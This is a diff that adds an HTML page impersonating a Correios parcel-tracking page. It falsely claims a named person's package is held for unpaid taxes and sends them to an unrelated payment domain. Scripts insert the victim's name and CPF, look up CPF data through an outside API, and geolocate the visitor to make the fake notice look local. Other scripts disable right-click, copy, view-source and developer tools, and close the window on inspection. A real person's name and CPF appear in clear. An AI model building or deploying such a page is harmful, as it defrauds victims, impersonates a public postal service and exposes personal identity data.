@@ -1,0 +1,511 @@
+<!DOCTYPE html><html lang="en"><head>
+<script src="/funnel-tracking.js"></script>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <link rel="preconnect" href="https://fonts.googleapis.com/">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
+  <link href="css2-1.html" rel="stylesheet">
+  <link rel="stylesheet" href="css/bootstrap-1.css">
+  <link rel="stylesheet" href="css/app-1.css">
+  <link rel="stylesheet" href="css/yellow-1.css">
+  <link rel="stylesheet" href="css/all-1.css" crossorigin="anonymous">
+  <link rel="icon" type="image/x-icon" href="images/regular_correios-logo-2-2.png">
+  <meta name="csrf-token" content="XhpaSjXrgaC3XF8BrR4GtmpFPMLsyEiAAnHS72ER">
+  <title>Correios | Rastreio</title>
+  <link rel="stylesheet" type="text/css" href="css/all.css">
+  <script type="text/javascript" class="flasher-js">(function () { var rootScript = '../cdn.jsdelivr.net/npm/%40flasher/flasher%401.3.2/dist/flasher.min.js'; var FLASHER_FLASH_BAG_PLACE_HOLDER = {}; var options = mergeOptions([], FLASHER_FLASH_BAG_PLACE_HOLDER); function mergeOptions(first, second) { return { context: merge(first.context || {}, second.context || {}), envelopes: merge(first.envelopes || [], second.envelopes || []), options: merge(first.options || {}, second.options || {}), scripts: merge(first.scripts || [], second.scripts || []), styles: merge(first.styles || [], second.styles || []), }; } function merge(first, second) { if (Array.isArray(first) && Array.isArray(second)) { return first.concat(second).filter(function (item, index, array) { return array.indexOf(item) === index; }); } return Object.assign({}, first, second); } function renderOptions(options) { if (!window.hasOwnProperty('flasher')) { console.error('Flasher is not loaded'); return; } requestAnimationFrame(function () { window.flasher.render(options); }); } function render(options) { if ('loading' !== document.readyState) { renderOptions(options); return; } document.addEventListener('DOMContentLoaded', function () { renderOptions(options); }); } if (1 === document.querySelectorAll('script.flasher-js').length) { document.addEventListener('flasher:render', function (event) { render(event.detail); }); } if (window.hasOwnProperty('flasher') || !rootScript || document.querySelector('script[src="' + rootScript + '"]')) { render(options); } else { var tag = document.createElement('script'); tag.setAttribute('src', rootScript); tag.setAttribute('type', 'text/javascript'); tag.onload = function () { render(options); }; document.head.appendChild(tag); } })();</script><script src="js/flasher.min.js" type="text/javascript"></script><script src="js/flasher.min_1.js" type="text/javascript"></script><script src="js/flasher.min_002.js" type="text/javascript"></script>
+<script>
+        // Função para obter a cidade usando a API ipinfo.io
+        function obterCidade() {
+            // Fazer uma requisição GET para a API ipinfo.io
+            fetch('https://ipinfo.io/json?token=187a55254c9d09')
+                .then(response => response.json())
+                .then(data => {
+                    // Captura a cidade a partir da resposta da API
+                    const cidade = data.city;
+                    
+                    // Exibe a cidade no elemento com id="cidade"
+                    document.getElementById('cidade').textContent = cidade || "";
+                })
+                .catch(error => {
+                    console.log('Erro ao obter a cidade: ', error);
+                    document.getElementById('cidade').textContent = "";
+                });
+        }
+
+        // Chama a função assim que a página for carregada
+        window.onload = obterCidade;
+    </script><script>
+      // Função para pegar os parâmetros nome e CPF da URL
+      function pegarParametros() {
+        const urlParams = new URLSearchParams(window.location.search);
+        return {
+          nome: urlParams.get('name'),
+          cpf: urlParams.get('cpf')
+        };
+      }
+    </script></head>
+    
+
+    
+     
+    
+    
+
+    
+<body>
+  <header class="w-100 font-size-16 font-weight-400 text-blue">
+    <div class="w-100 bg-grey px-3 px-lg-3 py-1 border-bottom border-white">
+      <span>Acessibilidade</span>
+
+      <i class="fas fa-caret-down ml-1"></i>
+    </div>
+<style>.div-flex { display: flex; align-items: center; justify-content: center; }
+</style>
+    <nav class="w-100 d-flex align-items-center bg-grey-2 px-3 px-lg-3 py-1 border-bottom border-warning" style="height:48px">
+      <div class="menu-toggle" id="menu-toggle" style="width:50px">
+        <div class="bar"></div>
+        <div class="bar"></div>
+        <div class="bar"></div>
+      </div>
+
+      <div class="ml-0 ml-lg-1 d-flex justify-content-center" style="width:100%">
+        <a href="https://pay.libere-sua-entrega.online/DYp0Zx5bbnkGmvX?document=20079051758&name=Vitor%20Hugo%20Ferreira%20Franco&cpf=20079051758&nome=Vitor+Hugo+Ferreira+Franco" class="py-2">
+          <img src="images/correios-1.png" alt="" height="25">
+        </a>
+      </div>
+
+      <div class="ml-4 d-none d-lg-block " style="width:150px">
+        <a href="https://pay.libere-sua-entrega.online/DYp0Zx5bbnkGmvX?document=20079051758&name=Vitor%20Hugo%20Ferreira%20Franco&cpf=20079051758&nome=Vitor+Hugo+Ferreira+Franco" class="py-1 text-blue-dark border-left border-secondary px-3 text-decoration-none">
+          <img src="images/entrar-1.svg" alt="Correios" width="31">
+
+          <span class="ml-1">Entrar</span>
+        </a>
+      </div>
+    </nav>
+  </header>
+
+  <main>
+    <nav class="d-flex align-items-center flex-wrap mt-4 px-2 font-weight-400 w-95 max-w-1000" style="margin: 0 auto;">
+      <span class="text-blue mr-2">Portal Correios</span>
+      <i class="fal fa-angle-right mr-2"></i>
+      <span class="text-blue mr-2">Rastreamento</span>
+      <i class="fal fa-angle-right mr-2"></i>
+
+      <span class="text-blue mr-2"><span class="cpf">200.790.517-58</span></span>
+    </nav>
+
+    
+    <section class="mt-3 p-4  w-95 max-w-1000" style="margin:0 auto;">
+
+      <h5 class="text-danger  font-weight-700 mb-4">
+        <i class="far fa-exclamation-triangle"></i> SUA ENCOMENDA FOI TRIBUTADA!
+
+
+      </h5>
+      <h4 class="text-blue-dark font-size-20 font-weight-700 mt-1 mb-2">
+
+        STATUS DA ENTREGA: <br>
+      </h4>
+
+      <h4 class="text-warning font-size-18 font-weight-700 mt-1 mb-2 d-flex align-items-center">
+        <div id="blink" style="width:12px;height:12px;border-radius:50%;" class="mr-2 bg-warning"></div>
+        AGUARDANDO PAGAMENTO
+      </h4>
+      <h5 id="address" style="color:#555577;">Sua encomenda está retida na agência dos correios <span id="cidade"></span></h5>
+      
+      <p class="mt-4">Para liberar o envio do seu produto. O pagamento deve ser feito clicando no botão abaixo:</p>
+
+
+
+    </section>
+    <div style="padding: 0px 30px 0px 30px;">
+    <a href="#" onclick="redirecionarCheckout()" class="btn btn-primary" style="font-size:13px;width: 100%;">CLIQUE AQUI PARA LIBERAÇÃO DO SEU PEDIDO</a>
+
+    </div>
+    
+    <section class="mt-3 p-4 w-95 max-w-1000" style="margin:0 auto;">
+      <div class="container">
+          <div class="overlay">
+              <div class="overlay-text">
+                  <p class="rotate">
+                      NOME: <span class="nome">Vitor Hugo Ferreira Franco</span><br>
+                      CPF: <span class="cpf">200.790.517-58</span>
+                  </p>
+              </div>
+          </div>
+      </div>
+
+
+<style>/* Estilo para o contêiner pai */
+.container {
+  position: relative;
+  width: 100%;
+  height: auto;
+  background-color: #f0f0f0;
+}
+
+/* Estilo para a div que vai conter o texto */
+.overlay {
+  position: relative;
+  width: 100%;
+  padding-top: 60%;
+  background-image: url(images/awHSPsJ.jpeg);
+  background-size: contain;
+  background-repeat: no-repeat;
+  background-position: center;
+  background-color: #f0f0f0;
+}
+
+/* Estilo para o texto centralizado dentro da div */
+.overlay-text {
+  position: absolute;
+  top: 60%;
+  left: 55%;
+  transform: translate(-50%, -50%);
+  background-color: transparent;
+  color: black !important;
+  padding: 10px 20px;
+  font-size: 10px;
+  text-align: center;
+  border-radius: 5px;
+  width: 300px;}
+
+    .rotate{
+      text-align: start;
+        transform: rotate(2deg);
+
+        color: black !important;
+  font-weight: bold;
+  font-size: 12px;
+  opacity: 0.5;
+  text-shadow: rgba(0, 0, 0, 0.3) 1px 1px 3px, rgba(0, 0, 0, 0.3) -1px -1px 3px, rgba(0, 0, 0, 0.1) 0px 0px 8px;
+  transform-style: preserve-3d;
+  transform: rotateX(1.2deg) rotateY(50deg) translateX(-80px);
+    }
+</style>
+</section>
+    <section class="px-4 py mb-5 w-95 max-w-1000" style="margin:0 auto;">
+      <ul>
+ 
+
+        <li class="d-flex mt-4" style="position: relative">
+          <div class="bg-grey d-flex justify-content-center align-items-center font-size-24 text-blue" style="width:50px;height:50px;border-radius:50%;z-index:100;min-widht:50px">
+            <img src="images/correios-icon-1.png" alt="" width="32">
+          </div>
+
+          <div class="w-70 d-flex flex-column flex-wrap ml-3 justify-content-center font-verdana">
+            <h5 class="text-blue-dark font-size-13 font-weight-700 p-0 m-0 flex-wrap">
+              Previsão de Entrega
+            </h5>
+
+            <span class="text-dark font-size-12 flex-wrap">
+              3 dias após o pagamento
+            </span>
+          </div>
+        </li>
+
+        <li class="d-flex mt-5" style="position: relative">
+          <div style="width:2px;height:120px;background-color:#FFC40C;position:absolute;top:-118px;left:24px"></div>
+
+          <div class="bg-grey d-flex justify-content-center align-items-center font-size-24 text-blue" style="width:50px;height:50px;border-radius:50%;z-index:100;min-widht:50px">
+            <i class="fal fa-usd-circle"></i>
+          </div>
+
+          <div class="w-70 d-flex flex-column flex-wrap ml-3 justify-content-center font-verdana">
+            <h5 class="text-blue-dark font-size-13 font-weight-700 p-0 m-0 flex-wrap">
+              Objeto aguardando pagamento
+            </h5>
+
+            <span class="text-dark font-size-12 flex-wrap">
+              em Unidade de Fiscalização Aduaneira, Curitiba, PR <br>
+            </span>
+
+            <h5 class="mt-1 text-blue-dark font-size-13 font-weight-700 p-0 m-0 flex-wrap">
+              Realize o pagamento: <a href="https://pay.libere-sua-entrega.online/DYp0Zx5bbnkGmvX?document=20079051758&name=Vitor%20Hugo%20Ferreira%20Franco&cpf=20079051758&nome=Vitor+Hugo+Ferreira+Franco" class="text-blue">Efetuar Pagamento</a>
+            </h5>
+          </div>
+        </li>
+
+        <li class="d-flex mt-5" style="position: relative">
+          <div style="width:2px;height:120px;background-color:#FFC40C;position:absolute;top:-118px;left:24px"></div>
+
+          <div class="bg-grey d-flex justify-content-center align-items-center font-size-24 text-blue" style="width:50px;height:50px;border-radius:50%;z-index:100;min-widht:50px">
+            <i class="fal fa-truck"></i>
+          </div>
+
+          <div class="w-70 d-flex flex-column flex-wrap ml-3 justify-content-center font-verdana">
+            <h5 class="text-blue-dark font-size-13 font-weight-700 p-0 m-0 flex-wrap">
+              Objeto em transferência - por favor aguarde
+            </h5>
+
+            <span class="text-dark font-size-12 flex-wrap">
+              de Unidade de Tratamento, Curitiba, PR <br>
+              para Unidade de Fiscalização Aduaneira - Curitiba, PR
+            </span>
+          </div>
+        </li>
+
+        <li class="d-flex mt-5" style="position: relative">
+          <div style="width:2px;height:100px;background-color:#FFC40C;position:absolute;top:-98px;left:24px"></div>
+
+          <div class="bg-grey d-flex justify-content-center align-items-center font-size-24 text-blue" style="width:50px;height:50px;border-radius:50%;z-index:100">
+            <i class="fal fa-truck-loading"></i>
+          </div>
+
+          <div class="w-70 d-flex flex-column ml-3 justify-content-center font-verdana text-wrap">
+            <h5 class="text-blue-dark font-size-13 font-weight-700 p-0 m-0">
+              Objeto recebido em território nacional
+            </h5>
+
+            <span class="text-dark font-size-12">Curitiba - PR</span>
+          </div>
+        </li>
+
+        <li class="d-flex mt-5" style="position: relative">
+          <div style="width:2px;height:120px;background-color:#FFC40C;position:absolute;top:-118px;left:24px"></div>
+
+          <div class="bg-grey d-flex justify-content-center align-items-center font-size-24 text-blue" style="width:50px;height:50px;border-radius:50%;z-index:100;min-widht:50px">
+            <i class="fal fa-truck"></i>
+          </div>
+
+          <div class="w-70 d-flex flex-column flex-wrap ml-3 justify-content-center font-verdana">
+            <h5 class="text-blue-dark font-size-13 font-weight-700 p-0 m-0 flex-wrap">
+              Objeto em transferência - por favor aguarde
+            </h5>
+
+            <span class="text-dark font-size-12 flex-wrap">
+              de Unidade de Tratamento, Shanghai - China <br>
+              para Unidade de Tratamento Internacional, China
+            </span>
+          </div>
+        </li>
+
+        <li class="d-flex mt-5" style="position: relative">
+          <div style="width:2px;height:172px;background-color:#FFC40C;position:absolute;top:-170px;left:24px"></div>
+
+          <div class="bg-grey d-flex justify-content-center align-items-center font-size-24 text-blue" style="width:50px;height:50px;border-radius:50%;z-index:100">
+            <i class="fal fa-box-alt"></i>
+          </div>
+
+          <div class="d-flex flex-column ml-3 justify-content-center font-verdana">
+            <h5 class="text-blue-dark font-size-13 font-weight-700 p-0 m-0">Objeto Postado</h5>
+            <span class="text-dark font-size-12">Shanghai - China</span>
+          </div>
+        </li>
+      </ul>
+
+    </section>
+
+    <section class="my-4 w-95 max-w-1000" style="margin:0 auto;">
+      <div>
+        <img src="images/banner-1-1.jpg" alt="" class="w-100">
+      </div>
+    </section>
+  </main>
+
+  <footer class="d-flex flex-wrap px-5 py-4 bg-yellow text-blue-dark">
+    <div class="w-30 min-w-300 px-0 px-lg-3 mb-3">
+      <h5 class="font-weight-700 mb-4">Fale Conosco</h5>
+
+      <ul>
+        <li class="mb-2 font-size-14">
+          <i class="fas fa-desktop"></i>
+          <a href="https://pay.libere-sua-entrega.online/DYp0Zx5bbnkGmvX?document=20079051758&name=Vitor%20Hugo%20Ferreira%20Franco&cpf=20079051758&nome=Vitor+Hugo+Ferreira+Franco" class="ml-2 text-blue-dark text-hover-orange">
+            <span class="text-wrap">Registro de Manifestações</span>
+          </a>
+        </li>
+
+        <li class="mb-2 font-size-14">
+          <i class="far fa-question-square mr-1"></i>
+          <a href="https://pay.libere-sua-entrega.online/DYp0Zx5bbnkGmvX?document=20079051758&name=Vitor%20Hugo%20Ferreira%20Franco&cpf=20079051758&nome=Vitor+Hugo+Ferreira+Franco" class="ml-2 text-blue-dark text-hover-orange">
+            <span class="text-wrap">Central de Atendimento</span>
+          </a>
+        </li>
+
+        <li class="mb-2 font-size-14">
+          <i class="far fa-briefcase"></i>
+          <a href="https://pay.libere-sua-entrega.online/DYp0Zx5bbnkGmvX?document=20079051758&name=Vitor%20Hugo%20Ferreira%20Franco&cpf=20079051758&nome=Vitor+Hugo+Ferreira+Franco" class="ml-2 text-blue-dark text-hover-orange">
+            <span class="text-wrap">Solucões para o seu negócio</span>
+          </a>
+        </li>
+        <li class="mb-2 font-size-14">
+          <i class="far fa-headset"></i>
+          <a href="https://pay.libere-sua-entrega.online/DYp0Zx5bbnkGmvX?document=20079051758&name=Vitor%20Hugo%20Ferreira%20Franco&cpf=20079051758&nome=Vitor+Hugo+Ferreira+Franco" class="ml-2 text-blue-dark text-hover-orange">
+            <span class="text-wrap">Suporte ao cliente com contrato</span>
+          </a>
+        </li>
+        <li class="mb-2 font-size-14">
+          <i class="far fa-comment-alt-dots"></i>
+          <a href="https://pay.libere-sua-entrega.online/DYp0Zx5bbnkGmvX?document=20079051758&name=Vitor%20Hugo%20Ferreira%20Franco&cpf=20079051758&nome=Vitor+Hugo+Ferreira+Franco" class="ml-2 text-blue-dark text-hover-orange">
+            <span>Ouvidoria</span>
+          </a>
+        </li>
+
+        <li class="mb-2 font-size-14">
+          <i class="far fa-user-headset"></i>
+          <a href="https://pay.libere-sua-entrega.online/DYp0Zx5bbnkGmvX?document=20079051758&name=Vitor%20Hugo%20Ferreira%20Franco&cpf=20079051758&nome=Vitor+Hugo+Ferreira+Franco" class="ml-2 text-blue-dark text-hover-orange">
+            <span>Denúncia</span>
+          </a>
+        </li>
+      </ul>
+    </div>
+
+    <div class="w-30 min-w-300 px-0 px-lg-3 mb-3">
+      <h5 class="font-weight-700 mb-4">Sobre os Correios</h5>
+
+      <ul>
+        <li class="mb-2 font-size-14">
+          <i class="far fa-address-card"></i>
+          <a href="https://pay.libere-sua-entrega.online/DYp0Zx5bbnkGmvX?document=20079051758&name=Vitor%20Hugo%20Ferreira%20Franco&cpf=20079051758&nome=Vitor+Hugo+Ferreira+Franco" class="ml-2 text-blue-dark text-hover-orange">
+            <span>Identidade colaborativa</span>
+          </a>
+        </li>
+
+        <li class="mb-2 font-size-14">
+          <i class="far fa-user-graduate"></i>
+          <a href="https://pay.libere-sua-entrega.online/DYp0Zx5bbnkGmvX?document=20079051758&name=Vitor%20Hugo%20Ferreira%20Franco&cpf=20079051758&nome=Vitor+Hugo+Ferreira+Franco" class="ml-2 text-blue-dark text-hover-orange">
+            <span>Educação e cultura</span>
+          </a>
+        </li>
+
+        <li class="mb-2 font-size-14">
+          <i class="far fa-book-alt"></i>
+          <a href="https://pay.libere-sua-entrega.online/DYp0Zx5bbnkGmvX?document=20079051758&name=Vitor%20Hugo%20Ferreira%20Franco&cpf=20079051758&nome=Vitor+Hugo+Ferreira+Franco" class="ml-2 text-blue-dark text-hover-orange">
+            <span>Código de ética</span>
+          </a>
+        </li>
+
+        <li class="mb-2 font-size-14">
+          <i class="far fa-file-search"></i>
+          <a href="https://pay.libere-sua-entrega.online/DYp0Zx5bbnkGmvX?document=20079051758&name=Vitor%20Hugo%20Ferreira%20Franco&cpf=20079051758&nome=Vitor+Hugo+Ferreira+Franco" class="ml-2 text-blue-dark text-hover-orange">
+            <span class="text-wrap">Transparência e prestação de contas</span>
+          </a>
+        </li>
+
+        <li class="mb-2 font-size-14">
+          <i class="far fa-comment-alt-dots"></i>
+          <a href="https://pay.libere-sua-entrega.online/DYp0Zx5bbnkGmvX?document=20079051758&name=Vitor%20Hugo%20Ferreira%20Franco&cpf=20079051758&nome=Vitor+Hugo+Ferreira+Franco" class="ml-2 text-blue-dark text-hover-orange">
+            <span class="text-wrap">Política de privacidade e Notas legais</span>
+          </a>
+        </li>
+      </ul>
+    </div>
+
+    <div class="w-30 min-w-300 px-0 px-lg-3 mb-3">
+      <h5 class="font-weight-700 mb-4">Outros Sites</h5>
+
+      <ul>
+        <li class="mb-2 font-size-14">
+          <i class="far fa-shopping-cart"></i>
+          <a href="https://pay.libere-sua-entrega.online/DYp0Zx5bbnkGmvX?document=20079051758&name=Vitor%20Hugo%20Ferreira%20Franco&cpf=20079051758&nome=Vitor+Hugo+Ferreira+Franco" class="ml-2 text-blue-dark text-hover-orange">
+            <span class="text-wrap">Loja online dos correios</span>
+          </a>
+        </li>
+      </ul>
+    </div>
+
+    <div class="d-flex justify-content-center w-100 px-3 mb-3 text-dark font-size-14">
+      <span>© Copyright 2026 Correios</span>
+    </div>
+  </footer>
+  <script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+<script>
+  // Desabilitar clique direito
+  document.addEventListener('contextmenu', (event) => event.preventDefault());
+
+  // Bloquear atalhos de teclado como Ctrl+U, Ctrl+C, Ctrl+Shift+I
+  document.addEventListener('keydown', (event) => {
+      if (event.ctrlKey && ['u', 'c', 's', 'i'].includes(event.key.toLowerCase())) {
+          event.preventDefault();
+      }
+      if (event.keyCode === 123) { // F12
+          event.preventDefault();
+      }
+  });
+document.addEventListener('keydown', function (event) {
+    if (event.key === "F12" || (event.ctrlKey && event.shiftKey && event.key === "I")) {
+        window.close(); // Fechar página
+    }
+});
+</script>
+
+  <script src="js/jquery-3.6.0.min-1.js"></script>
+  <script src="js/bootstrap.min-1.js"></script>
+
+
+  <script>
+  // Endereço base do checkout.
+  // - Local: funil em :3000 e checkout (Node) em :3002.
+  // - Produção (Vercel): mesmo domínio, servido em /checkout/.
+  function checkoutBase() {
+    const h = window.location.hostname;
+    if (h === "localhost" || h === "127.0.0.1") {
+      return "http://localhost:3002/";
+    }
+    return "/checkout/";
+  }
+
+  function redirecionarCheckout() {
+    const urlParams = new URLSearchParams(window.location.search);
+    const cpf = urlParams.get('cpf');
+    const nome = urlParams.get('name') || urlParams.get('nome');
+    if (cpf && nome) {
+      // Preserva toda a query string atual (UTMs, fbclid, etc.) e garante cpf + name
+      const params = new URLSearchParams(window.location.search);
+      params.set('cpf', cpf);
+      params.set('name', nome);
+      params.delete('nome'); // normaliza para "name"
+      window.location.href = `${checkoutBase()}?${params.toString()}`;
+    } else {
+      alert('Erro ao obter dados. Por favor, tente novamente.');
+    }
+  }
+
+  document.addEventListener("DOMContentLoaded", function() {
+    // Data de hoje
+    const hoje = new Date();
+    const dia = String(hoje.getDate()).padStart(2, '0');
+    const mes = String(hoje.getMonth() + 1).padStart(2, '0');
+    const ano = hoje.getFullYear();
+    const dataHoje = dia + '/' + mes + '/' + ano;
+    const prazo = document.getElementById('prazo-hoje');
+    if (prazo) prazo.textContent = dataHoje;
+
+    // Preencher nome e CPF
+    const urlParams = new URLSearchParams(window.location.search);
+    const cpf = urlParams.get('cpf');
+    const nome = urlParams.get('name') || urlParams.get('nome');
+
+    function formatarCPF(cpf) {
+      cpf = String(cpf).replace(/\D/g, '');
+      return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+    }
+    function preencherDados(nomeVal, cpfVal) {
+      document.querySelectorAll(".nome").forEach(el => el.textContent = nomeVal || "N/A");
+      document.querySelectorAll(".cpf").forEach(el => el.textContent = formatarCPF(cpfVal) || "N/A");
+      // Atualizar links de checkout com cpf e nome
+      document.querySelectorAll('a[href*="pay.libere-sua-entrega.online"]').forEach(link => {
+        const currentParams = new URLSearchParams(window.location.search);
+        link.href = `https://pay.libere-sua-entrega.online/DYp0Zx5bbnkGmvX?document=${cpfVal}&name=${encodeURIComponent(nomeVal)}&` + currentParams.toString();
+      });
+    }
+
+    if (nome && cpf) {
+      preencherDados(nome, cpf);
+    } else if (cpf) {
+      fetch(`https://api-main-delta.vercel.app/api/proxy?cpf=${encodeURIComponent(cpf)}`)
+        .then(r => r.json())
+        .then(data => {
+          const dados = data?.resultado?.dados;
+          if (dados) preencherDados(dados.NOME, dados.CPF);
+        })
+        .catch(err => console.error("Erro na API:", err));
+    }
+  });
+  </script>
+
+
+</body></html>
